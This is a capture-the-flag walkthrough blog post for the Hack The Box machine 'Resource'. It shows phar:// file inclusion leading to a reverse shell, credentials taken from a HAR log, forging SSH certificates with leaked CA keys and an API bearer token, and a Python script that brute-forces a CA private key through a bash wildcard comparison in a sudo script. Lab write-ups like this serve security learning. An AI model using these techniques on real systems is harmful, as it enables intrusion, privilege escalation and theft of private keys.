---
layout: post
title: "HTB: Resource"
box: resource
img: /img/resource/resource
author: Andrew Cherney
date: 2024-11-23
tags: htb medium-box season-6 linux webapp php phar ca-cert custom-code bash sudo
icon: "assets/icons/resource.png"
post_description: "An underrated box from 0xdf that utilizes perhaps a little too much key signing. Starting this off is a webapp which can pop a shell after using the phar:// protocol in conjunction with the zip file upload function. Look to ticket zip files for a .har log file which holds msainristil's password for SSH access. Once in this container a keypair can be generated and signed with a 'decommissioned' certificate authority key which allows SSH into zzinter*. As this new user a new keypair can be signed for the support user through a script provided in zzinter's home. The SSH into support is for port 2222, and next using parts from the script an API can be tricked into giving a zzinter certificate with yet another keypair. Lastly a sudo run bash script is vulnerable to wildcard exfiltration which leaks the ca key, allowing you to sign the last keypair and SSH into root."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
nmap -p- 10.10.11.27

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

```bash
nmap -sCV -p22,80,2222 10.10.11.27

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://itrc.ssg.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2 ssh ports, maybe one of them goes to a container and the other is the real machine. Hard to make predictions now though.

## Port 80

```bash
dirsearch -u http://itrc.ssg.htb -x 403

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/6_Season/Resource/reports/http_itrc.ssg.htb/_24-08-07_15-07-20.txt

Target: http://itrc.ssg.htb/

[15:07:20] Starting: 
[15:07:42] 200 -   46B  - /admin.php
[15:07:55] 301 -  310B  - /api  ->  http://itrc.ssg.htb/api/
[15:07:58] 301 -  313B  - /assets  ->  http://itrc.ssg.htb/assets/
[15:08:11] 200 -   46B  - /dashboard.php
[15:08:12] 200 -    0B  - /db.php
[15:08:22] 200 -  507B  - /home.php
[15:08:31] 200 -  241B  - /login.php
[15:08:32] 302 -    0B  - /logout.php  ->  index.php
[15:08:53] 200 -  263B  - /register.php
[15:09:10] 301 -  314B  - /uploads  ->  http://itrc.ssg.htb/uploads/
```

```bash
dirsearch -u http://itrc.ssg.htb/api -x 403

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/6_Season/Resource/reports/http_itrc.ssg.htb/_api_24-08-07_15-12-26.txt

Target: http://itrc.ssg.htb/

[15:12:27] Starting: api/
[15:12:44] 500 -    0B  - /api/admin.php
[15:13:25] 302 -    0B  - /api/login.php  ->  /
[15:13:39] 302 -    0B  - /api/register.php  ->  /

Task Completed
```

{% include img_link src="/img/resource/resource_front_page" alt="front_page" ext="png" trunc=600 %}

Nothing here but to register and poke around.

![default dashboard raccoon]({{ page.img }}_raccoon_dashboard.png)

A simple ticket opening and closing service seems to be present here. When making a ticket you have the option to upload a .zip file. I tried uploading an empty zip to see what happens while making a test ticket.

![test ticket creation]({{ page.img }}_ticket_test_creation.png)

![ticket error empty zip]({{ page.img }}_gnarly_error_ticket_creation.png)

![test ticket upload]({{ page.img }}_test_ticket_zip_upload.png)

Some info is leaked here that the file saving script is savefile.inc.php which is POSTed with the info to save the files in the appropriate locations. When viewing a ticket there is direct object reference within the url `http://itrc.ssg.htb/?page=ticket&id=9` but after fuzzing it seems permissions are set properly so no idor. I tried to inject some XSS into the ticket but it properly stringified the payloads I used.

This is when I remembered there is an admin.php endpoint I scanned and it gave a 200. 

![admin dashboard]({{ page.img }}_admin_dashboard.png)

Though this is more to play around with I am unable to view these other tickets, and the Admin Tools seem locked down enough to not let me execute arbitrary commands.

# Shell as www-data

## phar://

The last thing here I haven't experimented with is the ?page= parameter being used to denote the page you are on. A notable feature is that this page is clearly a php file but the tickets page only references ?page=ticket. This might be able to be used with the upload feature to run php.

The pieces here are all in place I just need a way to allow me to traverse directories and get to the file upload I control. In searching for that I found a [a potential way to call a php file with phar://](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization). This exploit is not about phar deserialization but the protocol of phar might allow me to specify the file location to run.

I upload a test.php file within a zip and attempt to run it with `http://itrc.ssg.htb/?page=phar://../uploads/7d28703ae5a17238aff5867d3a23784751daf229.zip/test.php` and nothing happens. I attempt with a pentestmonkey.php revshell and try to run it at `http://itrc.ssg.htb/?page=phar://../uploads/90d8daae8d96a66d4ab15e36123290c0825b065d.zip/pentestmonkey.php` again nothing. Maybe the directory traversal is the issue here.

I try again with the already uploaded revshell removing the traversal `http://itrc.ssg.htb/?page=phar://uploads/90d8daae8d96a66d4ab15e36123290c0825b065d.zip/pentestmonkey`

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.27 46674
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64 GNU/Linux
 02:20:36 up  6:43,  0 user,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@itrc:/$ 
```

# User* as zzinter

## Pivot to msainristil

Firstly here I made a call to check if I could interface with the mysql database backing the webapp. There wasn't the mysql service running here which indicates that this might actually be a docker container I am in. The db.php file reads as follows:

```bash
www-data@itrc:/var/www/itrc$ cat db.php
cat db.php
<?php

$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "ugEG5rR5SG8uPd";
$pdo = new PDO($dsn, $dbusername, $dbpassword);

try {
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
    }
```

That password doesn't give me access to any account or service I could find. I tried for a little bit to make a php file that I could go to and read mysql queries but my attempts ended in errors.

![sql read test]({{ page.img }}_raccoonphp_sql_test.png)

But now that I have access to the webapp filesystem I can go check what zip files were uploaded by other users.

```bash
www-data@itrc:/var/www/itrc/uploads$ for file in *.zip; do unzip $file; done
for file in *.zip; do unzip $file; done
Archive:  21de93259c8a45dd2223355515f1ee70d8763c8a.zip
  inflating: shell.php               
Archive:  7a5fc0e1320e9c71763916db8c2eefc10b822a3d.zip
 extracting: test                    
Archive:  7d28703ae5a17238aff5867d3a23784751daf229.zip
replace test? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: test                    
Archive:  88dd73e336c2f81891bddbe2b61f5ccb588387ef.zip
replace shell.php? [y]es, [n]o, [A]ll, [N]one, [r]ename: 
error:  invalid response [{ENTER}]
replace shell.php? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: shell.php               
Archive:  90d8daae8d96a66d4ab15e36123290c0825b065d.zip
  inflating: pentestmonkey.php       
Archive:  b829beac87ea0757d7d3432edeac36c6542f46c4.zip
replace shell.php? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: shell.php               
Archive:  c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
  inflating: itrc.ssg.htb.har        
Archive:  e8c6575573384aeeab4d093cc99c7e5927614185.zip
  inflating: id_rsa.pub              
Archive:  eb65074fe37671509f24d1652a44944be61e4360.zip
  inflating: id_ed25519.pub    
www-data@itrc:/var/www/itrc/uploads$ ls
ls
21de93259c8a45dd2223355515f1ee70d8763c8a.zip
7a5fc0e1320e9c71763916db8c2eefc10b822a3d.zip
7d28703ae5a17238aff5867d3a23784751daf229.zip
88dd73e336c2f81891bddbe2b61f5ccb588387ef.zip
90d8daae8d96a66d4ab15e36123290c0825b065d.zip
b829beac87ea0757d7d3432edeac36c6542f46c4.zip
c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
e8c6575573384aeeab4d093cc99c7e5927614185.zip
eb65074fe37671509f24d1652a44944be61e4360.zip
id_ed25519.pub
id_rsa.pub
itrc.ssg.htb.har
pentestmonkey.php
shell.php
test
```

That har file is a json-formatted archive file format used for logging purposes, if I grep around that I might be able to find some goodies since from what I can glean it has a group of web requests made. 

```bash
cat itrc.ssg.htb.har | grep PHPSESS
              "value": "PHPSESSID=715eb6b6bc27fcafcbe73bd0a33223bc"
              "name": "PHPSESSID",
              "value": "PHPSESSID=715eb6b6bc27fcafcbe73bd0a33223bc"
              "name": "PHPSESSID",
              "value": "PHPSESSID=715eb6b6bc27fcafcbe73bd0a33223bc"
              "name": "PHPSESSID",
              "value": "PHPSESSID=715eb6b6bc27fcafcbe73bd0a33223bc"
              "name": "PHPSESSID",
              "value": "PHPSESSID=715eb6b6bc27fcafcbe73bd0a33223bc"
              "name": "PHPSESSID",
              "value": "PHPSESSID=715eb6b6bc27fcafcbe73bd0a33223bc"
              "name": "PHPSESSID",
```

Tried to login with this session token but it clearly expired or is for another service I don't have access to. I inspected the login page to be sending parameters of user and pass, I searched for user to find any instances of someone logging in within the logs.

```bash
cat itrc.ssg.htb.har | grep user
            "text": "user=msainristil&pass=82yards2closeit",
                "name": "user",
```

```bash
www-data@itrc:/var/www/itrc/api$ su msainristil
su msainristil
Password: 82yards2closeit
id
uid=1000(msainristil) gid=1000(msainristil) groups=1000(msainristil)
cd /home
ls
msainristil
zzinter
cd ~
ls
decommission_old_ca
keypair
keypair-cert.pub
keypair.pub
ls .ssh
known_hosts
known_hosts.old
```

I check for sudo permissions but it isn't present here, yet more proof this is a container I need to find a way to escape from.

## Signing Keys Pt.1

I create a keypair and ssh in for a better shell, little did I know that I would be in fact creating a lot of keypairs. Within that decommission_old_ca directory is a ca kepair. TLDR; Certificate authorities can sign keys to effectively "authorize" their use for a given user/principal. The ssh-keygen man page doesn't have the info needed to sign keys so I needed to dig around.

[https://man.openbsd.org/OpenBSD-current/man1/ssh-keygen.1#NAME](https://man.openbsd.org/OpenBSD-current/man1/ssh-keygen.1#NAME) defines a way to use ssh-keygen with a certificate_identity -I, ca_key -s, and principals -n. Assuming this ca is still in use I can sign a public key for zzinter (the other user on the container) then ssh in.

```bash
msainristil@itrc:~$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/msainristil/.ssh/id_rsa): zzinter
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in zzinter
Your public key has been saved in zzinter.pub
The key fingerprint is:
SHA256:L97qAaeIBsOrEwvBx/awycvS7XlCiwErnLFFgGUBh2Y msainristil@itrc
The key's randomart image is:
+---[RSA 3072]----+
|o=*.             |
|oE .             |
|+ o              |
|o+ *             |
|+o@ = . S        |
|+B.* + + .       |
|o+= B o o .      |
|+o = +.o +       |
|... .oo.+..      |
+----[SHA256]-----+
msainristil@itrc:~$ ssh-keygen -s decommission_old_ca/ca-itrc -n zzinter -I raccoon zzinter.pub
Signed user key zzinter-cert.pub: id "raccoon" serial 0 for zzinter valid forever
```

Grab those files to my machine then use the key to SSH in, now make a note here I did make a mistake that I did not realize would make further SSH attempts more of a hassle. See if you can find out what I missed in the below command.

```bash
scp msainristil@ssg.htb:/home/msainristil/zzinter* .
msainristil@ssg.htb's password: 
zzinter                                                                           100% 2602    31.8KB/s   00:00    
zzinter-cert.pub                                                                  100% 2019    25.3KB/s   00:00    
zzinter.pub   

chmod 400 zzinter

ssh zzinter@ssg.htb -i zzinter
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug  7 22:54:54 2024 from 10.10.14.6
zzinter@itrc:~$ cat user.txt
7b33953145e8--------------------
```

# User as zzinter

## Escaping Docker

### Signing Keys Pt.2

```bash
zzinter@itrc:~$ ls -al
total 48
drwx------ 1 zzinter zzinter 4096 Aug  7 22:48 .
drwxr-xr-x 1 root    root    4096 Jul 23 14:22 ..
lrwxrwxrwx 1 root    root       9 Jul 23 14:22 .bash_history -> /dev/null
-rw-r--r-- 1 zzinter zzinter  220 Mar 29 19:40 .bash_logout
-rw-r--r-- 1 zzinter zzinter 3526 Mar 29 19:40 .bashrc
-rw-r--r-- 1 zzinter zzinter  807 Mar 29 19:40 .profile
-rw------- 1 zzinter zzinter  810 Aug  7 22:47 .viminfo
-rw-r--r-- 1 zzinter zzinter  994 Aug  7 22:47 cracker.py #(ignore this other user's)
-rw------- 1 zzinter zzinter 1823 Aug  7 22:48 keypair
-rw-r--r-- 1 zzinter zzinter  394 Aug  7 22:48 keypair.pub
-rw-rw-r-- 1 root    root    1193 Feb 19 16:43 sign_key_api.sh
-rw-r----- 1 root    zzinter   33 Aug  7 19:37 user.txt
zzinter@itrc:~$ cat sign_key_api.sh 
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

Here is a basic script that will POST the request to sign a key to an api at signserv.ssg.htb/v1/sign and probably return the cert.pub file created from the command I used but forgot to use when SSHing into zzinter* (that is what I missed I needed to add a -o flag and it is very important for later).

At this point it was time to brute force a user to SSH into port 2222. bcmcgregor was a user I found earlier and I attempted to use this name first. He doesn't exist it was a waste of time, same for zzinter and msainristil. 

```bash
zzinter@itrc:~$ bash sign_key_api.sh bcmcgregor.pub bcmcgregor support > bcmcgregor.cert
zzinter@itrc:~$ ls
bcmcgregor  bcmcgregor.cert  bcmcgregor.pub  cracker.py  sign_key_api.sh  user.txt
zzinter@itrc:~$ 

ssh -o CertificateFile=bcmcgregor.cert -i bcmcgregor bcmcgregor@ssg.htb -p 2222
The authenticity of host '[ssg.htb]:2222 ([10.10.11.27]:2222)' can't be established.
ECDSA key fingerprint is SHA256:RW8pXV2+tLjbb+gADuD/zQC9SYBfkPHvVJpoSjDhDdQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[ssg.htb]:2222,[10.10.11.27]:2222' (ECDSA) to the list of known hosts.
bcmcgregor@ssg.htb's password: 
```

Then it was time to brute force the principals from the script and keeping the same name as the principal. Starting with security and going upwards.

```bash
zzinter@itrc:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/zzinter/.ssh/id_rsa): security
Enter passphrase (empty for no passphrase): 

zzinter@itrc:~$ bash sign_key_api.sh security.pub security security > security.cert

scp -i zzinter zzinter@ssg.htb:/home/zzinter/secur* .
security                                                                          100% 2602    14.0KB/s   00:00    
security.cert                                                                     100% 1115    13.4KB/s   00:00    
security.pub  

ssh -o CertificateFile=security.cert -i security security@ssg.htb -p 2222
security@ssg.htb's password: 
```

```bash
zzinter@itrc:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/zzinter/.ssh/id_rsa): support
Enter passphrase (empty for no passphrase): 

zzinter@itrc:~$ bash sign_key_api.sh support.pub support support > support.cert  

scp -i zzinter zzinter@ssg.htb:/home/zzinter/support* .
support                                                                           100% 2602    33.0KB/s   00:00    
support.cert                                                                      100%  113     1.4KB/s   00:00    
support.pub

ssh -o CertificateFile=support.cert -i support support@ssg.htb -p 2222
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)
...
support@ssg:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -             
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -             
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      -             
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -             
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -             
tcp6       0      0 :::22                   :::*                    LISTEN      -             
tcp6       0      0 :::2222                 :::*                    LISTEN      -             
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -             
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -         
```

## SSHing to zzinter

### Signing Keys Pt.3

There was the webservice that generated these certificates I was using at port 8000. I take the hint of this being a certificate based box and check /etc/ssh and find, would you have guessed, more certificates.


```bash
support@ssg:~$ ls /etc/ssh
auth_principals   ca-security.pub  sshd_config.ucf-dist         ssh_host_ecdsa_key.pub         ssh_host_rsa_key.pub
ca-analytics      moduli           ssh_host_dsa_key             ssh_host_ed25519_key           ssh_import_id
ca-analytics.pub  ssh_config       ssh_host_dsa_key-cert.pub    ssh_host_ed25519_key-cert.pub
ca-it             ssh_config.d     ssh_host_dsa_key.pub         ssh_host_ed25519_key.pub
ca-it.pub         sshd_config      ssh_host_ecdsa_key           ssh_host_rsa_key
ca-security       sshd_config.d    ssh_host_ecdsa_key-cert.pub  ssh_host_rsa_key-cert.pub
support@ssg:~$ ls /etc/ssh/auth_principals/
root  support  zzinter
support@ssg:~$ cat /etc/ssh/auth_principals/zzinter
zzinter_temp
support@ssg:~$ cat /etc/ssh/auth_principals/root
root_user
```

[This blog post is a good overview of this ssh+ca cert structure](https://dmuth.medium.com/ssh-at-scale-cas-and-principals-b27edca3a5d) and for our purposes it's only relevant to know that in order to properly sign a key that is usable it needs to have a principal of what is defined within the /etc/ssh/auth_principals directory. That means when making a zzinter key I need to sign with the zzinter_temp principal.  

Thanks to the earlier bash script I can grab the entire api request including the Authorization I need to generate keys.

```bash
curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

```bash
curl -s http://localhost:8000/v1/sign -d '{"pubkey": "'"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC66pWOnbV5zBTNwQJ9rWN4SL/xPOV4EmIykXT0gnVFav4UOOVlUFY/PXce7OysVwg+Bn2knGcLQlyQEtpYC3WPGUHDL1qyOpZjjzhxTVCjzTJrX+gVUO8b9BTlX1dCvflanwUaWPM1XN76uOYo5sLb5J9dzd4nL/7KKOPYiAGDWIeG7U/f31w1JuW4lySUVqjpj0BrXetbQOk6AveQ7wHZ4ai2fwBxcrfWR/LQWTf5Lw3j4+HCQv+1DBKEgQsCODUhLmjeFwOQ5n6RkMB0NK6W3V5zRuf21jEVmHstaOmz8eDEnUlS6mqnxstLIbWtLm6o0lafREuEyJAOoA7tU1n2oWqp1FzXFVi7D2ueCUWp0D4ZdS/Pie5eGaZVEoNBbgVDuKnyEhsoldeUJJtCjVZkzq0K2qNh3iIq83vEwLf5XPfZOGWKeeQz0HA2ewNk2rOQDqTrnTTgwE6d2bJTNDQa4TJz6cs79wwpAScsf3syYrg+G8NZUac8BpqAg7G1YrM= raccoon@cyberraccoon-virtualbox"'", "username": "'"root"'", "principals": "'"root_user"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
{"detail":"Root access must be granted manually. See the IT admin staff."}
```

Well it wouldn't be that simple would it ...

```bash
curl -s http://localhost:8000/v1/sign -d '{"pubkey": "'"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC66pWOnbV5zBTNwQJ9rWN4SL/xPOV4EmIykXT0gnVFav4UOOVlUFY/PXce7OysVwg+Bn2knGcLQlyQEtpYC3WPGUHDL1qyOpZjjzhxTVCjzTJrX+gVUO8b9BTlX1dCvflanwUaWPM1XN76uOYo5sLb5J9dzd4nL/7KKOPYiAGDWIeG7U/f31w1JuW4lySUVqjpj0BrXetbQOk6AveQ7wHZ4ai2fwBxcrfWR/LQWTf5Lw3j4+HCQv+1DBKEgQsCODUhLmjeFwOQ5n6RkMB0NK6W3V5zRuf21jEVmHstaOmz8eDEnUlS6mqnxstLIbWtLm6o0lafREuEyJAOoA7tU1n2oWqp1FzXFVi7D2ueCUWp0D4ZdS/Pie5eGaZVEoNBbgVDuKnyEhsoldeUJJtCjVZkzq0K2qNh3iIq83vEwLf5XPfZOGWKeeQz0HA2ewNk2rOQDqTrnTTgwE6d2bJTNDQa4TJz6cs79wwpAScsf3syYrg+G8NZUac8BpqAg7G1YrM= raccoon@cyberraccoon-virtualbox"'", "username": "'"zzinter"'", "principals": "'"zzinter_temp"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgC3aJyUsYeyf9S8CMvPapnbfE16YVXkiyqYSeNcgykeoAAAADAQABAAABgQC66pWOnbV5zBTNwQJ9rWN4SL/xPOV4EmIykXT0gnVFav4UOOVlUFY/PXce7OysVwg+Bn2knGcLQlyQEtpYC3WPGUHDL1qyOpZjjzhxTVCjzTJrX+gVUO8b9BTlX1dCvflanwUaWPM1XN76uOYo5sLb5J9dzd4nL/7KKOPYiAGDWIeG7U/f31w1JuW4lySUVqjpj0BrXetbQOk6AveQ7wHZ4ai2fwBxcrfWR/LQWTf5Lw3j4+HCQv+1DBKEgQsCODUhLmjeFwOQ5n6RkMB0NK6W3V5zRuf21jEVmHstaOmz8eDEnUlS6mqnxstLIbWtLm6o0lafREuEyJAOoA7tU1n2oWqp1FzXFVi7D2ueCUWp0D4ZdS/Pie5eGaZVEoNBbgVDuKnyEhsoldeUJJtCjVZkzq0K2qNh3iIq83vEwLf5XPfZOGWKeeQz0HA2ewNk2rOQDqTrnTTgwE6d2bJTNDQa4TJz6cs79wwpAScsf3syYrg+G8NZUac8BpqAg7G1YrMAAAAAAAAAJwAAAAEAAAAHenppbnRlcgAAABAAAAAMenppbnRlcl90ZW1wAAAAAGarFUH//////////wAAAAAAAACCAAAAFXBlcm1pdC1YMTEtZm9yd2FyZGluZwAAAAAAAAAXcGVybWl0LWFnZW50LWZvcndhcmRpbmcAAAAAAAAAFnBlcm1pdC1wb3J0LWZvcndhcmRpbmcAAAAAAAAACnBlcm1pdC1wdHkAAAAAAAAADnBlcm1pdC11c2VyLXJjAAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIHg8Cudy1ShyYfqzC3ANlgAcW7Q4MoZuezAE8mNFSmxAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEB8e+7paCSd/uGrH7lZs/kx/xm+vr1LM+AdFj0734t6TPff4ufNiQryX1Z7YTv+OnkxfI0JFmPooeXfJSwoA/EJ raccoon@cyberraccoon-virtualbox
```

Save that as zzinter.cert then SSH in finally as the real zzinter user on a non docker machine. Notable here this is a fake user.txt flag, it does nothing.

```bash
ssh -o CertificateFile=zzinter.cert -i zzinter zzinter@ssg.htb -p 2222
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)
...
zzinter@ssg:~$ ls
user.txt
zzinter@ssg:~$ cat user.txt 
deb20ac7f50aabf7ace60d92bc86aacc
```

# Root

## /opt/sign_key.sh

### Wildcard Fuzzing

```bash
zzinter@ssg:~$ sudo -l
Matching Defaults entries for zzinter on ssg:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zzinter may run the following commands on ssg:
    (root) NOPASSWD: /opt/sign_key.sh
```


```bash
zzinter@ssg:~$ bash /opt/sign_key.sh 
Usage: /opt/sign_key.sh <ca_file> <public_key_file> <username> <principal> <serial>
zzinter@ssg:~$ cat /opt/sign_key.sh 
#!/bin/bash

usage () {
    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
    exit 1
}

if [ "$#" -ne 5 ]; then
    usage
fi

ca_file="$1"
public_key_file="$2"
username="$3"
principal="$4"
serial="$5"

if [ ! -f "$ca_file" ]; then
    echo "Error: CA file '$ca_file' not found."
    usage
fi

if [[ $ca == "/etc/ssh/ca-it" ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if ! [[ $serial =~ ^[0-9]+$ ]]; then
    echo "Error: '$serial' is not a number."
    usage
fi

ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principals" "$public_key_name"
```

A more verbose version of the script used in the zzinter container home directory, minus of course the API call. I did however see a vulnerability that exists within bash comparisons. This specific exploit is identical to [HTB Codify](https://cybercherney.github.io/2024/04/12/HTB_Codify.html) where a bash variable check of [ var1 == var2 ] allows the user controlled variable to use a wildcard and exfiltrate the variable it is compared against. So if var2="abcd" and var1="a*" it would read as being true. 



### Custom_code

This script of /opt/sign_key.sh compares the entered ca entered to the ca-it key and will specify to use the API to generate keys if they are equal. I can use this to define a positive result in my code. Next since this will be a multiline key I need to continually write a file to use and hold the current line info along with the entire cert info, so I define those variables and add conditions for when they interact. Putting that all together the following code was constructed.

```bash
#!/bin/python3

import subprocess

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/-.@ +='
cert = ''
line = ''
found = False

while not found:
    for i in characters:
        check = cert + line + str(i) + '*'
        file = 'cracked.cert'
        with open(file, 'w') as r:
            r.write(check)
        
        command = ''.join(["sudo /opt/sign_key.sh cracked.cert success zzinter webserver 123456"])
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Use API for signing with this CA." in output:
            line += str(i)
            print(line)
            break
    else:
        if line != '-----END OPENSSH PRIVATE KEY-----':
            cert += line + "\n"
            line = ''
        else:
          found = True
```

It is of note here that the ending key output will include =* at the end of the file but otherwise this should run and grab the entire key. If this stops for you copy what you have in cracked.cert and turn the cert variable into a multiline string of whatever was inside (minus the last 2 characters).

```bash
zzinter@ssg:/tmp/.raccoon$ python3 cert_grabber.py 
-
--
---
----
-----
-----B
-----BE
-----BEG
-----BEGI
-----BEGIN
-----BEGIN 
-----BEGIN O
-----BEGIN OP
-----BEGIN OPE
-----BEGIN OPEN
-----BEGIN OPENS
-----BEGIN OPENSS
-----BEGIN OPENSSH
-----BEGIN OPENSSH 
...
```

Initially I forgot to add = into the character list which caused the script to fail in spectacular fashion. The script worked though after that and that's all I care about.

```bash
zzinter@ssg:/tmp/.raccoon$ cat cracked.cert 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAE----------------------------------
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAH----------------------------------
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctU----------------------------------
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzga----------------------------------
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBT----------------------------------
QBAgM=
-----END OPENSSH PRIVATE KEY-----
```

Finally we sign yet another public key with the generated cert and ssh into root.

```bash
zzinter@ssg:/tmp/.raccoon$ ssh-keygen -s cracked.cert -n root_user -I raccoon root.pub
Signed user key root-cert.pub: id "raccoon" serial 0 for root_user valid forever

